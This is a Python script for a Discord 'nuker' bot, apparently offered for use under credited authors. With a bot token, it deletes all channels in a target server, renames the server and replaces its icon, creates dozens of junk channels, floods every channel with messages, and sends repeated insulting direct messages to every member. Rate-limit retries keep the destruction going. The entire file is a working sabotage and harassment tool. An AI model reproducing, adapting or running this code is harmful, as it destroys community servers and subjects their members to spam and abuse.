import asyncio
import os
import discord

intents = discord.Intents.all()
client = discord.Client(intents = intents)
name = "Here goes the server name"
name_channel = "Here goes the name of the channels"
message_dmspam = "responde hijodetodatuputamadre @c1q__"

async def change_info(guild):
    try:
        await guild.edit(name = name)
        print(f'✅: The name was changed successfully')

        if os.path.exists('icon.png'):
            with open('icon.png', "rb") as f:
                icon = f.read()

                await guild.edit(icon=icon)
                print(f'✅: The icon was changed successfully')
        else:
            print(f'⚠️: Icon not found')
    except discord.HTTPException as e:
        if "rate limited" in str(e).lower():
            await asyncio.sleep(10)
            await change_info(guild)

async def create_channels(guild):
    tasks = []
    for i in range(26):
        async def text_channel():
            try:
                await guild.create_text_channel(name_channel)
                await asyncio.sleep(0.4)
            except discord.HTTPException as e:
                if "rate limited" in str(e).lower():
                    await asyncio.sleep(10)
                    await text_channel()
        
        async def voice_channel():
            try:
                await guild.create_voice_channel(name_channel)
                await asyncio.sleep(0.4)
            except discord.HTTPException as e:
                if "rate limited" in str(e).lower():
                    await asyncio.slee(10)
                    await voice_channel()
        
        tasks.append(text_channel())
        tasks.append(voice_channel())
    await asyncio.gather(*tasks, return_exceptions = True)

async def dmspam(guild):
    tasks = []
    async def spamdm(member):
        if member.bot:
            return
        
        for _ in range(6):
            try:
                await member.send(message_dmspam)
                await asyncio.sleep(0.4)
            except discord.HTTPException as e:
                if "rate limited" in str(e).lower():
                    await asyncio.sleep(10)
                    await member.send(message_dmspam)
                else:
                    print(f'error')
    for member in guild.members:
        tasks.append(spamdm(member))
    await asyncio.gather(*tasks, return_exceptions = True)

async def spam(guild):
    message = input("Enter your message: ")
    async def spamming(channel):
        try:
            await channel.send(message)
            await asyncio.sleep(0.1)
        except discord.HTTPException as e:
            if "rate limited" in str(e).lower():
                await asyncio.sleep(10)
                await spamming()
    tasks = []
    for channel in guild.channels:
        for i in range(6):
            tasks.append(spamming(channel))
    await asyncio.gather(*tasks, return_exceptions = True)

os.system('cls')
def main():
    token = input("Enter token")
    SERVER_ID = int(input("Enter serverid: "))

    @client.event
    async def on_ready():
        guild = client.get_guild(SERVER_ID)
        if not guild:
            print(f'⚠️: Server not found')
            return
        
        os.system('cls')
        banner = """
                      ::::::::  ::::    ::: :::   ::: :::    ::: ::::::::::: ::::::::   ::::::::  :::  
                    :+:    :+: :+:+:   :+: :+:   :+: :+:    :+:     :+:    :+:    :+: :+:    :+: :+:   
                   +:+    +:+ :+:+:+  +:+  +:+ +:+   +:+  +:+      +:+    +:+    +:+ +:+    +:+ +:+    
                  +#+    +:+ +#+ +:+ +#+   +#++:     +#++:+       +#+    +#+    +:+ +#+    +:+ +#+     
                 +#+    +#+ +#+  +#+#+#    +#+     +#+  +#+      +#+    +#+    +#+ +#+    +#+ +#+      
                #+#    #+# #+#   #+#+#    #+#    #+#    #+#     #+#    #+#    #+# #+#    #+# #+#       
                ########  ###    ####    ###    ###    ###     ###     ########   ########  ########## """
    
        information = f"""            ◥ Credits: lyxnwer    &     c1q__◤
                                        ◥ Conected as: {client.user} ◤
                                          ◣ Server: {guild.name}   ◢
                                            ◣ Options: [1] Nuker ◢"""
        
        print(banner + '\n' + information)

        options = input("Select an option: ")
        if options == '1':
            tasks = []
            for channel in guild.channels:
                async def nuker(channel=channel):
                    try:
                        await channel.delete()
                        print(f"✅: deleted channel {channel.name}")
                        await asyncio.sleep(0.5)
                    except discord.HTTPException as e:
                        if "rate limited" in str(e).lower():
                            print("⏳ Rate limit detected, expecting...")
                            await asyncio.sleep(10)
                            await nuker(channel)
                        else:
                            print(f'⚠️: Error when deleting channel {channel.name}: {e}')
                    except Exception as e:
                        print(f'⚠️: Unexpected error {e}')
                tasks.append(nuker())
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
            await change_info(guild)
            await create_channels(guild)
            await spam(guild)
            await dmspam(guild)
            
            os.system('cls' if os.name == 'nt' else 'clear')
            return

    client.run(token)
while True:
    main()
